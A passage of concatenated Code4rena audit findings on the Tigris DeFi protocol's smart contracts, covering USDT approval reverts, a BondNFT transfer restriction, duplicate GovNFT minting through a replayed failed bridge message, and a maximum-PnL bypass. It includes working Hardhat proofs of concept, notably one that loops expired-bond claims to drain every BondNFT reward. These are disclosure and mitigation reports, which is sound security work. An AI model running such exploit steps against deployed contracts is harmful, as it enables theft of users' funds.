describe("Correct calculation of new margin price while adding position", function () {   let owner;   let node;   let user;   let node2;   let node3;   let proxy;    let Trading;   let trading;    let TradingExtension;   let tradingExtension;    let TradingLibrary;   let tradinglibrary;    let StableToken;   let stabletoken;    let StableVault;   let stablevault;    let position;    let pairscontract;   let referrals;    let permitSig;   let permitSigUsdc;    let MockDAI;   let mockdai;   let MockUSDC;   let mockusdc;    let badstablevault;    let chainlink;    beforeEach(async function () {     await deployments.fixture(['test']);     [owner, node, user, node2, node3, proxy] = await ethers.getSigners();     StableToken = await deployments.get("StableToken");     stabletoken = await ethers.getContractAt("StableToken", StableToken.address);     Trading = await deployments.get("Trading");     trading = await ethers.getContractAt("Trading", Trading.address);     await trading.connect(owner).setMaxWinPercent(5e10);     TradingExtension = await deployments.get("TradingExtension");     tradingExtension = await ethers.getContractAt("TradingExtension", TradingExtension.address);     const Position = await deployments.get("Position");     position = await ethers.getContractAt("Position", Position.address);     MockDAI = await deployments.get("MockDAI");     mockdai = await ethers.getContractAt("MockERC20", MockDAI.address);     MockUSDC = await deployments.get("MockUSDC");     mockusdc = await ethers.getContractAt("MockERC20", MockUSDC.address);     const PairsContract = await deployments.get("PairsContract");     pairscontract = await ethers.getContractAt("PairsContract", PairsContract.address);     const Referrals = await deployments.get("Referrals");     referrals = await ethers.getContractAt("Referrals", Referrals.address);     StableVault = await deployments.get("StableVault");     stablevault = await ethers.getContractAt("StableVault", StableVault.address);     await stablevault.connect(owner).listToken(MockDAI.address);     await stablevault.connect(owner).listToken(MockUSDC.address);     await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);     await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther("1"));     await tradingExtension.connect(owner).setNode(node.address, true);     await tradingExtension.connect(owner).setNode(node2.address, true);     await tradingExtension.connect(owner).setNode(node3.address, true);     await network.provider.send("evm_setNextBlockTimestamp", [2000000000]);     await network.provider.send("evm_mine");     permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);     permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);      const BadStableVault = await ethers.getContractFactory("BadStableVault");     badstablevault = await BadStableVault.deploy(StableToken.address);      const ChainlinkContract = await ethers.getContractFactory("MockChainlinkFeed");     chainlink = await ChainlinkContract.deploy();      TradingLibrary = await deployments.get("TradingLibrary");     tradinglibrary = await ethers.getContractAt("TradingLibrary", TradingLibrary.address);     await trading.connect(owner).setLimitOrderPriceRange(1e10);   });     describe("Initial margin $500, leverage 2x, position $1000, price $1000", function () {     let orderId;     let initPrice = parseEther("1000");     beforeEach(async function () {       // To simpliy the problem, set fees to 0       await trading.setFees(true, 0, 0, 0, 0, 0);       await trading.setFees(false, 0, 0, 0, 0, 0);        let TradeInfo = [parseEther("500"), MockDAI.address, StableVault.address, parseEther("2"), 1, true, parseEther("0"), parseEther("0"), ethers.constants.HashZero];       let PriceData = [node.address, 1, initPrice, 0, 2000000000, false];       let message = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [node.address, 1, initPrice, 0, 2000000000, false]         )       );       let sig = await node.signMessage(         Buffer.from(message.substring(2), 'hex')       );              let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];       orderId = await position.getCount();       await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);       expect(await position.assetOpenPositionsLength(1)).to.equal(1);       let trade = await position.trades(orderId);       let marginAfterFee = trade.margin;       expect(marginAfterFee.eq(parseEther('500'))).to.equal(true);       expect(trade.price.eq(parseEther('1000'))).to.be.true;       expect(trade.leverage.eq(parseEther('2'))).to.be.true;     });      it.only("Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1999.99999", async function () {       // The price increases from $1000 to $2000, the old position earns $1000 profit.       // The expected PnL payout = old margin + earned profit + new margin       //                         = $500 + $1000 + $500       //                         = $2000       let addingPrice = parseEther('2000');       let addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];       let addingMessage = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [node.address, 1, addingPrice, 0, 2000000000, false]         )       );       let addingSig = await node.signMessage(         Buffer.from(addingMessage.substring(2), 'hex')       );        let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];       await trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);        let trade = await position.trades(orderId);       let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,         trade.margin, trade.leverage, trade.accInterest);       expect(pnl._payout.gt(parseEther('1999.99999'))).to.be.true;       expect(pnl._payout.lt(parseEther('2000'))).to.be.true;     });      it.only("Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $749.99999", async function () {       // The price decreases from $1000 to $750, the old position losses $250.       // The expected PnL payout = old margin - loss + new margin       //                         = $500 - $250 + $500       //                         = $750       let addingPrice = parseEther('750');       let addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];       let addingMessage = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [node.address, 1, addingPrice, 0, 2000000000, false]         )       );       let addingSig = await node.signMessage(         Buffer.from(addingMessage.substring(2), 'hex')       );        let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];       await trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);        let trade = await position.trades(orderId);       let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,         trade.margin, trade.leverage, trade.accInterest);       expect(pnl._payout.gt(parseEther('749.99999'))).to.be.true;       expect(pnl._payout.lt(parseEther('750'))).to.be.true;     });    }); });  ```  The test result ``` Correct calculation of new margin price while adding position     Initial margin $500, leverage 2x, position $1000, price $1000       √ Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1999.99999       √ Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $749.99999 ``` 
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/Faith-G.md).
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L652   # Vulnerability details  ## Impact  Traders will not be able to: 1. Initiate a market order 2. Add margin 3. Add to position 4. initiate limit order  If USDT is set as the margin asset and protocol is deployed on ethereum.  (Note: this issue was submitted after consulting with the sponsor even though currently there are no plans to deploy the platform on ethereum)  ## Proof of Concept  `USDT` has a race condition protection mechanism on ethereum chain: It does not allow users to change the allowance without first changing the allowance to 0.   `approve` function in `USDT` on ethereum: https://etherscan.io/token/0xdac17f958d2ee523a2206206994597c13d831ec7#code#L205 ```     function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {          // To change the approve amount you first have to reduce the addresses`         //  allowance to zero by calling `approve(_spender, 0)` if it is not         //  already 0 to mitigate the race condition described here:         //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729         require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));          allowed[msg.sender][_spender] = _value;         Approval(msg.sender, _spender, _value);     } ```  in `Trading` if users use `USDT` as margin to: 1. Initiate a market order 2. Add margin 3. Add to position 4. initiate limit order  The transaction will revert.   This is due to the the `_handleDeposit` which is called in all of the above uses.  `_handleDeposit` calls the `USDT` margin asset `approve` function with `type(uint).max`. From the second time `approve` will be called, the transaction will revert.  `_handleDeposit` in `Trading`: https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L652 ```     function _handleDeposit(address _tigAsset, address _marginAsset, uint256 _margin, address _stableVault , ERC20PermitData calldata _permitData, address _trader) internal { ------             IERC20(_marginAsset).transferFrom(_trader, address(this), _margin/_marginDecMultiplier);             IERC20(_marginAsset).approve(_stableVault, type(uint).max);             IStableVault(_stableVault).deposit(_marginAsset, _margin/_marginDecMultiplier); ------     } ```  ## Tools Used  VS Code  ## Recommended Mitigation Steps  No need to to approve `USDT` every time.  The protocol could: 1. Keep a record if allowance was already set on an address 2. Create an external function that can be called by the owner to approve the a token address
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/ReyAdmirado-G.md).
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L168-L187   # Vulnerability details  ## Impact Malicious user can drain all assets in BondNFT, and other users will lose their rewards.  ## Proof of Concept When calling [BondNFT.claim()](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L168-L187) for an expired bond, it will recalculate `accRewardsPerShare`. This is because the reward after the `expireEpoch` does not belong to that expired bond and needs to be redistributed to all other bonds.  ```solidity   if (bond.expired) {       uint _pendingDelta = (bond.shares * accRewardsPerShare[bond.asset][epoch[bond.asset]] / 1e18 - bondPaid[_id][bond.asset]) - (bond.shares * accRewardsPerShare[bond.asset][bond.expireEpoch-1] / 1e18 - bondPaid[_id][bond.asset]);       if (totalShares[bond.asset] > 0) {           accRewardsPerShare[bond.asset][epoch[bond.asset]] += _pendingDelta*1e18/totalShares[bond.asset];       }   } ```  In the current implementation of [BondNFT.claim()](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L168-L187), it can be called repeatedly as long as the expired bond is not released.  According to the formula in the above code, we can find that although each subsequent `claim()` of the expired bond will transfer 0 reward, the `accRewardsPerShare` will be updated cumulatively. Thus, the pending rewards of all other users will increase every time the expired bond is `claim()`ed.  A malicious user can exploit this vulnerability to steal all assets in BondNFT contract: 1. Create two bonds (B1, B2) with different `expireEpoch` 2. At some time after B1 has expired (B2 has not), keep calling [`Lock.claim(B1)`](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Lock.sol#L34) to increase rewards of B2 continuously, until the pending rewards of B2 approaches the total amount of asset in the contract. 3. Call [`Lock.claim(B2)`](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Lock.sol#L34) to claim all pending rewards of B2.  An example of such an attack: ```javascript diff --git a/test/09.Bonds.js b/test/09.Bonds.js index 16c3ff5..7c445c3 100644 --- a/test/09.Bonds.js +++ b/test/09.Bonds.js @@ -245,7 +245,90 @@ describe("Bonds", function () {        await lock.connect(user).release(2);        expect(await bond.pending(1)).to.be.equals("999999999999999999725"); // Negligable difference from 1000e18 due to solidity division      }); + +    it.only("Drain BondNFT rewards", async function () { +      const getState = async () => { +        const balHacker= await stabletoken.balanceOf(hacker.address); +        const balLock = await stabletoken.balanceOf(lock.address); +        const balBond = await stabletoken.balanceOf(bond.address); +        const [pending1, pending2, pending3] = [await bond.pending(1), await bond.pending(2), await bond.pending(3)]; +        return { hacker: balHacker, lock: balLock, bond: balBond, pending1, pending2, pending3}; +      }; +      const parseEther = (v) => ethers.utils.parseEther(v.toString()); +      const gwei = parseEther(1).div(1e9); + +      // prepare tokens +      const TotalRewards = parseEther(8000); +      await stabletoken.connect(owner).mintFor(owner.address, TotalRewards); +      await stabletoken.connect(owner).mintFor(user.address, parseEther(1000)); +      const hacker = rndAddress; +      await stabletoken.connect(owner).mintFor(hacker.address, parseEther(2000+700)); +      await stabletoken.connect(hacker).approve(Lock.address, parseEther(2000)); + +      // bond1 - user +      await lock.connect(user).lock(StableToken.address, parseEther(1000), 100); +      await bond.distribute(stabletoken.address, parseEther(3800)); +      expect(await bond.pending(1)).to.be.closeTo(parseEther(3800), gwei); +      // Skip some time +      await network.provider.send("evm_increaseTime", [20*86400]); +      await network.provider.send("evm_mine"); + +      // bond2 - hacker +      await lock.connect(hacker).lock(StableToken.address, parseEther(1000), 10); +      // bond3 - hacker +      await lock.connect(hacker).lock(StableToken.address, parseEther(1000), 100); + +      await bond.distribute(stabletoken.address, parseEther(2100)); + +      // Skip 10+ days, bond2 is expired +      await network.provider.send("evm_increaseTime", [13*86400]); +      await network.provider.send("evm_mine"); +      await bond.distribute(stabletoken.address, parseEther(2100)); + +      // check balances before hack +      let st = await getState(); +      expect(st.bond).to.be.equals(TotalRewards); +      expect(st.lock).to.be.equals(parseEther(3000)); +      expect(st.hacker).to.be.equals(parseEther(0+700)); +      expect(st.pending1).to.be.closeTo(parseEther(3800+1000+1000), gwei); +      expect(st.pending2).to.be.closeTo(parseEther(100), gwei); +      expect(st.pending3).to.be.closeTo(parseEther(1000+1000), gwei); + +      // first claim of expired bond2 +      await lock.connect(hacker).claim(2); +      st = await getState(); +      expect(st.bond).to.be.closeTo(TotalRewards.sub(parseEther(100)), gwei); +      expect(st.hacker).to.be.closeTo(parseEther(100+700), gwei); +      expect(st.pending1).to.be.gt(parseEther(3800+1000+1000)); +      expect(st.pending2).to.be.eq(parseEther(0)); +      expect(st.pending3).to.be.gt(parseEther(1000+1000)); + +      // hack +      const remainReward = st.bond; +      let pending3 = st.pending3; +      let i = 0; +      for (; remainReward.gt(pending3); i++) { +        // claim expired bond2 repeatedly +        await lock.connect(hacker).claim(2); +        // pending3 keeps increasing +        pending3 = await bond.pending(3); +      } +      console.log(`claim count: ${i}\nremain: ${ethers.utils.formatEther(remainReward)}\npending3: ${ethers.utils.formatEther(pending3)}\n`); + +      // send diff, then drain rewards in bond +      await stabletoken.connect(hacker).transfer(bond.address, pending3.sub(remainReward)); +      await lock.connect(hacker).claim(3); +      st = await getState(); +      // !! bond is drained !! +      expect(st.bond).to.be.eq(0); +      // !! hacker gets all rewards !! +      expect(st.hacker).to.be.eq(TotalRewards.add(parseEther(700))); +      expect(st.pending1).to.be.gt(parseEther(3800+1000+1000)); +      expect(st.pending2).to.be.eq(0); +      expect(st.pending3).to.be.eq(0); +    });    }); +    describe("Withdrawing", function () {      it("Only expired bonds can be withdrawn", async function () {        await stabletoken.connect(owner).mintFor(owner.address, ethers.utils.parseEther("100")); ```  Output: ```   Bonds     Rewards claim count: 41 remain: 7900.000000000000000002 pending3: 8055.7342616570405578        ✓ Drain BondNFT rewards    1 passing (4s)  ```  ## Tools Used VS Code  ## Recommended Mitigation Steps I recommend that an expired bond should be forced to `release()`, `claim()` an expired bond should revert.  Sample code:  ```solidity  diff --git a/contracts/BondNFT.sol b/contracts/BondNFT.sol index 33a6e76..77e85ae 100644 --- a/contracts/BondNFT.sol +++ b/contracts/BondNFT.sol @@ -148,7 +148,7 @@ contract BondNFT is ERC721Enumerable, Ownable {          amount = bond.amount;          unchecked {              totalShares[bond.asset] -= bond.shares; -            (uint256 _claimAmount,) = claim(_id, bond.owner); +            (uint256 _claimAmount,) = _claim(_id, bond.owner);              amount += _claimAmount;          }          asset = bond.asset; @@ -157,8 +157,9 @@ contract BondNFT is ERC721Enumerable, Ownable {          _burn(_id);          emit Release(asset, lockAmount, _owner, _id);      } +      /** -     * @notice Claim rewards from a bond +     * @notice Claim rewards from an unexpired bond       * @dev Should only be called by a manager contract       * @param _id ID of the bond to claim rewards from       * @param _claimer address claiming rewards @@ -168,6 +169,22 @@ contract BondNFT is ERC721Enumerable, Ownable {      function claim(          uint _id,          address _claimer +    ) public onlyManager() returns(uint amount, address tigAsset) { +        Bond memory bond = idToBond(_id); +        require(!bond.expired, "expired"); +        return _claim(_id, _claimer); +    } + +    /** +     * @notice Claim rewards from a releasing bond or an unexpired bond +     * @param _id ID of the bond to claim rewards from +     * @param _claimer address claiming rewards +     * @return amount amount of tigAsset claimed +     * @return tigAsset tigAsset token address +     */ +    function _claim( +        uint _id, +        address _claimer      ) public onlyManager() returns(uint amount, address tigAsset) {          Bond memory bond = idToBond(_id);          require(_claimer == bond.owner, "!owner"); ```  
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L329   # Vulnerability details  ## Impact  `BondNFT`s should be transferrable. According the the proposal and the sponsor, `BondNFT`s should could be sold and borrowed against. The proposal for context: https://gov.tigris.trade/#/proposal/0x2f2d1d63060a4a2f2718ebf86250056d40380dc7162fb4bf5e5c0b5bee49a6f3  The current implementation limits selling/depositing to only the same day that rewards are distributed for the `tigAsset` of the bond.  The impact if no rewards are distributed in the same day:  1. `BondNFT`s listed on open markets will not be able to fulfil the orders 2. `BondNFT`s deposited as collateral will not be release the collateral  Because other market/platforms used for selling/depositing will not call `claimGovFees` to distribute rewards, they will revert when trying to transfer the `BondNFT`.  Realistic examples could be `BondNFT`s listed on opensea.   Example of reasons why rewards would not be distributed in the same day: 1. Low activity from investors, rewards are distirbuted when users lock/release/extend 2. `tigAsset` is blacklisted in `BondNFT`, rewards will not be distributed in such case.   ## Proof of Concept  `BondNFT` has a mechanism to update the time `tigAsset` rewards are distributed. It uses a map that points to the last timestamp rewards were distributed for `epoch[tigAsset]`.   `distribute` function in `BondNFT`: https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L221 ```     function distribute(         address _tigAsset,         uint _amount     ) external {         if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) return;         IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount);         unchecked {             uint aEpoch = block.timestamp / DAY;             if (aEpoch > epoch[_tigAsset]) {                 for (uint i=epoch[_tigAsset]; i<aEpoch; i++) {                     epoch[_tigAsset] += 1;                     accRewardsPerShare[_tigAsset][i+1] = accRewardsPerShare[_tigAsset][i];                 }             }             accRewardsPerShare[_tigAsset][aEpoch] += _amount * 1e18 / totalShares[_tigAsset];         }         emit Distribution(_tigAsset, _amount);     } ``` (Please not that if the asset is blacklisted through `allowedAsset` the  `epoch[tigAsset]` will not be updated)  When `BondNFT`s are transfered, a check is implemented to make sure `epoch[tigAsset]` is updated to the current day.  According to the sponsor the reason for this check is to make sure that a bond that should be expired doesn't get transferred while the epoch hasn't yet been updated.  `_transfer` function in `BondNFT`: https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L329 ```     function _transfer(         address from,         address to,         uint256 _id     ) internal override {         Bond memory bond = idToBond(_id);         require(epoch[bond.asset] == block.timestamp/DAY, "Bad epoch");         require(!bond.expired, "Expired!");         unchecked {             require(block.timestamp > bond.mintTime + 300, "Recent update");             userDebt[from][bond.asset] += bond.pending;             bondPaid[_id][bond.asset] += bond.pending;         }         super._transfer(from, to, _id);     } ```  As can be seen above, if `epoch[tigAsset]` is not set to the same day of the transfer, the transfer will fail and the impacts in the impact section will happen.   ### Hardhat POC  There is already an implemented test showing that transfers fail when `epoch[tigAsset]` is not updated: https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/test/09.Bonds.js#L472 ```     it("Bond can only transferred if epoch is updated", async function () {       await stabletoken.connect(owner).mintFor(owner.address, ethers.utils.parseEther("3000"));       await lock.connect(owner).lock(StableToken.address, ethers.utils.parseEther("3000"), 365);        await network.provider.send("evm_increaseTime", [864000]);       await network.provider.send("evm_mine");        await expect(bond.connect(owner).safeTransferMany(user.address, [1])).to.be.revertedWith("Bad epoch");     }); ```  ## Tools Used  VS Code, Hardhat  ## Recommended Mitigation Steps  The reason for the check is to validate that a bond.expired updated according to the actual timestamp. Instead of having  ```         require(epoch[bond.asset] == block.timestamp/DAY, "Bad epoch");         require(!bond.expired, "Expired!"); ```  You could replace it with: ```  require(bond.expireEpoch  >= block.timestamp/DAY, "Transfer after expired not allowed"); ``` 
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L168   # Vulnerability details  ## Impact  In the contract `GovNFT`, it is possible to bridge the governance NFT to other chains. It is also stated in the document that: >NFT holders only earn the profits generated by the platform on the chain that the NFT is on.  It is assumed that there is only one unique NFT per token id. But there is a scenario that can lead to have more than one NFT with the same token id on different chains.  ## Proof of Concept   - Suppose Bob (honest user who owns an NFT with token id X on chain B) plans to bridge this NFT from chain B to chain A. So, Bob calls the function `crossChain` to bridge the NFT from chain B to chain A. Thus, his NFT will be burnt on chain B, and it is supposed to be minted on chain A. https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L124  - The `endpoint` is responsible to complete the bridging task on chain A.  - Suppose the `endpoint` calls the function `lzReceive` with low gas on chain A, so that the transaction will be not successful. ``` function lzReceive(         uint16 _srcChainId,         bytes memory _srcAddress,         uint64 _nonce,         bytes memory _payload     ) external override {         require(_msgSender() == address(endpoint), "!Endpoint");         (bool success, bytes memory reason) = address(this).excessivelySafeCall(gasleft()*4/5, 150, abi.encodeWithSelector(this.nonblockingLzReceive.selector, _srcChainId, _srcAddress, _nonce, _payload));         // try-catch all errors/exceptions         if (!success) {             failedMessages[_srcChainId][_srcAddress][_nonce] = keccak256(_payload);             emit MessageFailed(_srcChainId, _srcAddress, _nonce, _payload, reason);         }     } ``` https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L168  - Since the transaction was not successful, the message will be added as a failed message. ``` failedMessages[chainB][Bob's address][_nonce] = keccak256(_payload); ``` https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L178  - Then, due to network lag (or any server issue, or any failure in `endpoint`), the `endpoint` assumes that the transaction is not sent, and it again calls this function with enough gas, so, the NFT with token id X will be minted to Bob's address on chain A. The flow is as follows: `lzReceive` ==> `nonblockingLzReceive` ==> `_nonblockingLzReceive` ==> `_bridgeMint`  - Now Bob has the NFT on chain A. Moreover, he has a failed message on chain A.  - Then Bob calls the function `crossChain` to bridge that NFT from chain A to chain B. So, this NFT will be burnt on chain A, and minted to Bob's address on chain B.  - Now, Bob has the NFT with token id X on chain B. Moreover, he has a failed message on chain A.  - He calls the function `retryMessage` to retry the failed message on chain A. https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L206  - By doing so the NFT with token id X will be minted to Bob on chain A. The flow is as follows: `retryMessage` ==> `_nonblockingLzReceive` ==> `_bridgeMint`  - Now Bob has the NFT with token id X on both chain A and chain B. This is the vulnerability.   - Now he can for example sell the NFT on chain B while he is earning the profits generated by the platform on the chain A that the NFT is on.  - Please note that Bob can not call the function `retryMessage` while he owns the NFT on chain A. Because during minting the NFT, it checks whether the token id exists or not. That is why Bob first bridges the NFT to another chain, and then retries the failed message.  ***The vulnerability is that when the message is failed, it is not considered as consumed, so in case of a failure in `endpoint` it is possible to both having failed message and being able to mint it at the same time.***  Please note that if this scenario happens again, more NFT with the same token id X will be minted to Bob on different chains.   ## Tools Used  ## Recommended Mitigation Steps It is recommended to track the consumed messages, and add a consumed flag whenever the function `lzReceive` is called, because it will either immediately mint the NFT or add it to he failed messages to be minted later. ``` mapping(uint16 => mapping(bytes => mapping(uint64 => bool))) public consumedMessage;      function lzReceive(         uint16 _srcChainId,         bytes memory _srcAddress,         uint64 _nonce,         bytes memory _payload     ) external override {                  require(!consumedMessage[_srcChainId][_srcAddress][_nonce], "already consumed");         consumedMessage[_srcChainId][_srcAddress][_nonce] = true;          require(_msgSender() == address(endpoint), "!Endpoint");         (bool success, bytes memory reason) = address(this).excessivelySafeCall(gasleft()*4/5, 150, abi.encodeWithSelector(this.nonblockingLzReceive.selector, _srcChainId, _srcAddress, _nonce, _payload));         // try-catch all errors/exceptions         if (!success) {             failedMessages[_srcChainId][_srcAddress][_nonce] = keccak256(_payload);             emit MessageFailed(_srcChainId, _srcAddress, _nonce, _payload, reason);         }     } ```
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/0x4non-Q.md).
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L267-L269   # Vulnerability details  ## Impact To protect the fund of vault, the protocol has a security mechanism which limits   ``` Maximum PnL is +500%.  ``` source: https://docs.tigris.trade/protocol/trading-and-fees#limitations  But the implementation is missing to check this limitation while ````addToPosition()````, an attacker can exploit it to get more profit than expected.  ## Proof of Concept The following test case shows both normal case and the exploit scenario. In the normal case,  a 990 USD margin, get back a 500% of 4950 USD payout, and the profit is 3960 USD. In the exploit case, the attack will get an extra 2600+ USD profit than the normal case.  ``` const { expect } = require("chai"); const { deployments, ethers, waffle } = require("hardhat"); const { parseEther, formatEther } = ethers.utils; const { signERC2612Permit } = require('eth-permit'); const exp = require("constants");  describe("Design Specification: Maximum PnL is +500%", function () {    let owner;   let node;   let user;   let node2;   let node3;   let proxy;    let Trading;   let trading;    let TradingExtension;   let tradingExtension;    let TradingLibrary;   let tradinglibrary;    let StableToken;   let stabletoken;    let StableVault;   let stablevault;    let position;    let pairscontract;   let referrals;    let permitSig;   let permitSigUsdc;    let MockDAI;   let mockdai;   let MockUSDC;   let mockusdc;    let badstablevault;    let chainlink;    beforeEach(async function () {     await deployments.fixture(['test']);     [owner, node, user, node2, node3, proxy] = await ethers.getSigners();     StableToken = await deployments.get("StableToken");     stabletoken = await ethers.getContractAt("StableToken", StableToken.address);     Trading = await deployments.get("Trading");     trading = await ethers.getContractAt("Trading", Trading.address);     await trading.connect(owner).setMaxWinPercent(5e10);     TradingExtension = await deployments.get("TradingExtension");     tradingExtension = await ethers.getContractAt("TradingExtension", TradingExtension.address);     const Position = await deployments.get("Position");     position = await ethers.getContractAt("Position", Position.address);     MockDAI = await deployments.get("MockDAI");     mockdai = await ethers.getContractAt("MockERC20", MockDAI.address);     MockUSDC = await deployments.get("MockUSDC");     mockusdc = await ethers.getContractAt("MockERC20", MockUSDC.address);     const PairsContract = await deployments.get("PairsContract");     pairscontract = await ethers.getContractAt("PairsContract", PairsContract.address);     const Referrals = await deployments.get("Referrals");     referrals = await ethers.getContractAt("Referrals", Referrals.address);     StableVault = await deployments.get("StableVault");     stablevault = await ethers.getContractAt("StableVault", StableVault.address);     await stablevault.connect(owner).listToken(MockDAI.address);     await stablevault.connect(owner).listToken(MockUSDC.address);     await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);     await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther("1"));     await tradingExtension.connect(owner).setNode(node.address, true);     await tradingExtension.connect(owner).setNode(node2.address, true);     await tradingExtension.connect(owner).setNode(node3.address, true);     await network.provider.send("evm_setNextBlockTimestamp", [2000000000]);     await network.provider.send("evm_mine");     permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);     permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);      const BadStableVault = await ethers.getContractFactory("BadStableVault");     badstablevault = await BadStableVault.deploy(StableToken.address);      const ChainlinkContract = await ethers.getContractFactory("MockChainlinkFeed");     chainlink = await ChainlinkContract.deploy();      TradingLibrary = await deployments.get("TradingLibrary");     tradinglibrary = await ethers.getContractAt("TradingLibrary", TradingLibrary.address);     await trading.connect(owner).setLimitOrderPriceRange(1e10);   });     describe("Bypass the maximum PnL check to take extra profit", function () {     let orderId;     let closePriceData;     let closeSig;     let initPrice = parseEther("1000");     let closePrice = parseEther("2000");     beforeEach(async function () {       let maxWin = await trading.maxWinPercent();       expect(maxWin.eq(5e10)).to.equal(true);        let TradeInfo = [parseEther("1000"), MockDAI.address, StableVault.address, parseEther("10"), 1, true, parseEther("0"), parseEther("0"), ethers.constants.HashZero];       let PriceData = [node.address, 1, initPrice, 0, 2000000000, false];       let message = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [node.address, 1, initPrice, 0, 2000000000, false]         )       );       let sig = await node.signMessage(         Buffer.from(message.substring(2), 'hex')       );              let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];       orderId = await position.getCount();       await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);       expect(await position.assetOpenPositionsLength(1)).to.equal(1);       let trade = await position.trades(orderId);       let marginAfterFee = trade.margin;       expect(marginAfterFee.eq(parseEther('990'))).to.equal(true);        // Some time later       await network.provider.send("evm_setNextBlockTimestamp", [2000001000]);       await network.provider.send("evm_mine");              // Now the price is doubled, profit = margin * leverage = $990 * 10 = $9900       closePriceData = [node.address, 1, closePrice, 0, 2000001000, false];       let closeMessage = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [node.address, 1, closePrice, 0, 2000001000, false]         )       );       closeSig = await node.signMessage(         Buffer.from(closeMessage.substring(2), 'hex')       );      });      it.only("All profit is $9900, close the order normally, only get $3960 profit", async function () {       let balanceBefore = await stabletoken.balanceOf(owner.address);       await trading.connect(owner).initiateCloseOrder(orderId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);       let balanceAfter = await stabletoken.balanceOf(owner.address);       let marginAfterFee = parseEther("990");       let payout = balanceAfter.sub(balanceBefore);       expect(payout.eq(parseEther("4950"))).to.be.true;        let profit = 